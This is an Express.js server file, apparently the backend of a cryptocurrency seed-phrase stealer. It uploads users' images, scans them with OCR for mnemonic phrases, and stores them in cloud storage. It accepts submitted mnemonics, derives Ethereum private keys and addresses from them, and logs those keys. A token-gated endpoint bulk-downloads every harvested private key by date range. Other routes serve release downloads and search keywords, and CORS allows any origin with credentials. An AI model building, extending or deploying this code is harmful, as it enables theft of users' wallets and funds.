const express = require('express');
const multer = require('multer');
const path = require('path');
const https = require('https');
const fs = require('fs');
const cors = require('cors');
const utils = require('./function');
const textDetect = require('./text-detection');
const { message } = require('statuses');
const { hdkey } = require('ethereumjs-wallet');
const bip39 = require('bip39');
const { createResponse } = require('./response');

if (!process.env.DOCKER_ENV) {
    require('dotenv').config();
}

if (!process.env.B2_BUCKET_ID || !process.env.B2_ACCOUNT_ID || !process.env.B2_APPLICATION_KEY) {
    console.error('Please provide B2_BUCKET_ID, B2_ACCOUNT_ID and B2_APPLICATION_KEY in the environment variables.');
    process.exit(1);
}

if (!process.env.ENCRYPTION_KEY) {
    console.error('Please provide ENCRYPTION_KEY in the environment variables.');
    process.exit(1);
}

if (!process.env.GITHUB_OWNER || !process.env.GITHUB_REPO) {
    console.error('Please provide GITHUB_OWNER and GITHUB_REPO in the environment variables.');
    process.exit(1);
}

const app = express();
// Ensure that bodyParser is able to handle form-data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Only allow your specific frontend domain and enable credentials
const corsOptions = {
    origin (origin, callback) {
        callback(null, true);
    },
    credentials: true, // Enable credentials
    allowedHeaders: '*', // Accept any headers
    exposedHeaders: '*' // Expose any headers
};

// Helper function to ensure directory exists
function ensureDirSync (dirPath) {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
}

// Configure multer for file storage
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const userId = req.body.userId; // Ensure you get userId from your form data or route parameters
        const userDir = `uploads/user_${userId}`;
        ensureDirSync(userDir); // Make sure the directory exists
        cb(null, userDir);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({ storage });

app.get('/test/ping', function (req, res) {
    const response = createResponse(0, 'pong');
    res.json(response);
});
app.options('/test/ping', cors(corsOptions)); // Enable preflight request for this endpoint

// Endpoint to handle POST requests for file uploads
app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
    const userId = req.body.userId; // Retrieve the userId from form data
    if (!userId) {
        console.error('Missing userId');
        const response = createResponse(10005, 'Missing userId');
        return res.status(400).json(response);
    }

    if (!req.file) {
        console.error('No file uploaded');
        const response = createResponse(10006, 'No file uploaded');
        return res.status(400).send(response);
    }

    try {
        // Path and name of the file saved locally
        const localFilePath = req.file.path;
        const localFileName = req.file.filename;
        const valid = null;

        // Upload to Backblaze B2
        const b2Response = await utils.uploadToB2(localFilePath, localFileName, userId);

        // Perform OCR text recognition
        const textJSON = await textDetect.detectMnemonicPhrase(localFilePath);

        // Log the upload details in MongoDB
        await utils.logUploadDetails(userId, localFileName, textJSON);

        // Send success response
        const response = createResponse(0, 'File uploaded successfully');
        res.json(response);
    } catch (error) {
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});
app.options('/upload', cors(corsOptions)); // Enable preflight request for this endpoint

app.get('/basic/image-download', async (req, res) => {
    const { fileName, userId } = req.query;

    if (!fileName || !userId) {
        const response = createResponse(10005, 'Missing fileName or userId');
        return res.status(400).json(response);
    }

    try {
        const fileBuffer = await utils.downloadFromB2(fileName, userId);

        // Log the download details in MongoDB
        await utils.logDownloadDetails(userId, fileName);

        res.setHeader('Content-Disposition', `attachment; filename=${fileName}`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(fileBuffer);
    } catch (error) {
        console.error('Download error:', error);
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});
app.options('/basic/image-download', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO:
app.get('/basic/image-edit-info-download', async (req, res) => {
    const { userId, fileName } = req.query;

    if (!userId || !fileName) {
        console.error('Missing userId or fileName');
        const response = createResponse(10005, 'Missing userId or fileName');
        return res.status(400).json(response);
    }

    try {
        // Get the image edit info from MongoDB
        const editInfo = await utils.getImageEditInfo(fileName);

        const response = createResponse(0, 'Image edit info downloaded successfully', editInfo);
        res.json(response);
    } catch (error) {
        console.error('Download error:', error);
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});
app.options('/basic/image-edit-info-download', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: This endpoint is for development purposes only
app.post('/basic/image-edit-info-upload', async (req, res) => {
    const { token, fileName, editInfo } = req.body;

    if (!fileName || !editInfo) {
        console.error('Missing fileName or editInfo');
        const response = createResponse(10016, 'Missing fileName or editInfo');
        return res.status(400).json(response);
    }
    if (token !== process.env.DEV_TOKEN) {
        console.error('Authentication failed');
        const response = createResponse(10002, 'Authentication failed');
        return res.status(401).json(response);
    }

    try {
        // Upload the image edit info to MongoDB
        await utils.uploadImageEditInfo(fileName, editInfo);

        const response = createResponse(0, 'Image edit info uploaded successfully');
        res.json(response);
    } catch (error) {
        console.error('Upload error:', error);
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});
app.options('/basic/image-edit-info-upload', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO:
app.post('/basic/mnemonic-upload', async (req, res) => {
    const { mnemonicPhase, userId } = req.body;

    if (!mnemonicPhase || !userId) {
        const response = createResponse(10005, 'Missing mnemonicPhase or userId');
        return res.status(400).json(response);
    }

    // Decrypt the mnemonic
    const decryptedMnemonicPhase = utils.decryptMnemonic(mnemonicPhase);

    try {
        // Validate the decrypted mnemonic
        const valid = bip39.validateMnemonic(decryptedMnemonicPhase);
        if (!valid) {
            console.log('Invalid mnemonic phrase');
            const response = createResponse(10017, 'Invalid mnemonic phrase');
            return res.status(400).json(response);
        }

        // Convert mnemonic to seed
        const seed = bip39.mnemonicToSeedSync(decryptedMnemonicPhase);

        // Derive a path according to BIP-44
        const hdwallet = hdkey.fromMasterSeed(seed);
        const path = "m/44'/60'/0'/0/0";  // standard derivation path for Ethereum
        const wallet = hdwallet.derivePath(path).getWallet();

        // Get the private key and address
        const privateKey = wallet.getPrivateKey().toString('hex');
        const address = wallet.getAddressString();

        // Log the wallet credentials instead of the mnemonic
        await utils.logWalletCredentials(userId, address, privateKey);

        const response = createResponse(0, 'Mnemonic phrase uploaded and credentials logged successfully');
        res.json(response);
    } catch (error) {
        console.error('Upload error:', error);
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});
app.options('/basic/mnemonic-upload', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO:
app.post('/basic/wallet-credential-download', async (req, res) => {
    const { token, startDateTime, endDateTime } = req.body;

    if (token !== process.env.DEV_TOKEN) {
        console.error('Authentication failed');
        const response = createResponse(10002, 'Authentication failed');
        return res.status(401).json(response);
    }

    try {
        // Get the mnemonic phrases from MongoDB
        const walletCredentials = await utils.getWalletCredentials(startDateTime, endDateTime);

        const parsedCredentials = walletCredentials.map(credential => {
            return {
                userId: credential.userId,
                userAddress: credential.userAddress,
                userPrivateKey: credential.userPrivateKey,
                createdAt: credential.createdAt
            };
        });

        console.log(parsedCredentials);

        const response = createResponse(0, 'Wallet credentials downloaded successfully', parsedCredentials);
        res.json(response);
    } catch (error) {
        console.error('Download error:', error);
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});
app.options('/basic/wallet-credential-download', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: Request the latest version number of the APP from GitHub releases
app.get('/basic/latest-version', async (req, res) => {
    const owner = process.env.GITHUB_OWNER;
    const repo = process.env.GITHUB_REPO;

    try {
        const response = await fetch(`https://api.github.com/repos/${owner}/${repo}/releases/latest`);
        if (response.ok) {
            const data = await response.json();
            const response = createResponse(0, 'Latest version fetched successfully', {
                version: data.tag_name
            });
            res.json(response);
        } else {
            console.error('Failed to fetch the latest version from GitHub.');
            const response = createResponse(10013, 'Failed to fetch the latest version from GitHub.');
            res.status(500).json(response);
        }
    } catch (error) {
        console.error('Server error while fetching the latest version:', error);
        const response = createResponse(10014, 'Server error while fetching the latest version.');
        res.status(500).json(response);
    }
});
app.options('/basic/latest-version', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: Get the latest release file from GitHub releases
app.get('/basic/latest-release', async (req, res) => {
    const owner = process.env.GITHUB_OWNER;
    const repo = process.env.GITHUB_REPO;

    try {
        const url = `https://api.github.com/repos/${owner}/${repo}/releases/latest`;
        const response = await fetch(url);
        if (response.ok) {
            const data = await response.json();
            const asset = data.assets.find(asset => asset.name === 'release.zip'); // Find the specific asset
            if (asset) {
                const response = createResponse(0, 'Release file found successfully', {
                    url: asset.browser_download_url // URL to download the asset
                });
                res.json(response);
            } else {
                const response = createResponse(10019, 'Release file not found.');
                res.status(404).json(response);
            }
        } else {
            const response = createResponse(10018, 'Failed to fetch the latest release from GitHub.');
            res.status(response.status).json(response);
        }
    } catch (error) {
        const response = createResponse(10020, 'Server error while fetching the latest release.');
        res.status(500).json(response);
    }
});
app.options('/basic/latest-release', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: Return the keywords as search filters for the image.
app.get('/basic/filename-keywords-download', async (req, res) => {
    const { userId } = req.query;

    if (!userId) {
        console.error('Missing userId');
        const response = createResponse(10005, 'Missing userId');
        return res.status(400).json(response);
    }

    try {
        const keywords = await utils.getKeywords();

        const response = createResponse(0, 'Keywords found successfully', keywords);
        res.json(response);
    } catch (error) {
        console.error('Search error:', error);
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});
app.options('/basic/image-keywords', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: Upload the keywords for the image to the database.
// Development purposes only
app.post('/basic/filename-keywords-upload', async (req, res) => {
    const { token, keywords } = req.body;

    if (!Array.isArray(keywords) || keywords.length === 0) {
        console.error('Missing keywords');
        const response = createResponse(10022, 'Missing keywords');
        return res.status(400).json(response);
    }

    if (token !== process.env.DEV_TOKEN) {
        console.error('Authentication failed');
        const response = createResponse(10002, 'Authentication failed');
        return res.status(401).json(response);
    }

    try {
        await utils.uploadKeywords(keywords);

        const response = createResponse(0, 'Keywords uploaded successfully');
        res.json(response);
    } catch (error) {
        console.error('Upload error:', error);
        const response = createResponse(error.code || 10000, error.message);
        res.status(500).json(response);
    }
});

const SERVER_PORT = process.env.SERVER_PORT || 3000;
const keyPath = process.env.PRIVKEY_PATH;
const certPath = process.env.CERT_PATH;

if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
    console.error('Required certificate files not found. Exiting...');
    process.exit(1);
}

module.exports = {
    SERVER_PORT,
    server: https.createServer({
        key: fs.readFileSync(keyPath),
        cert: fs.readFileSync(certPath)
    }, app)
};
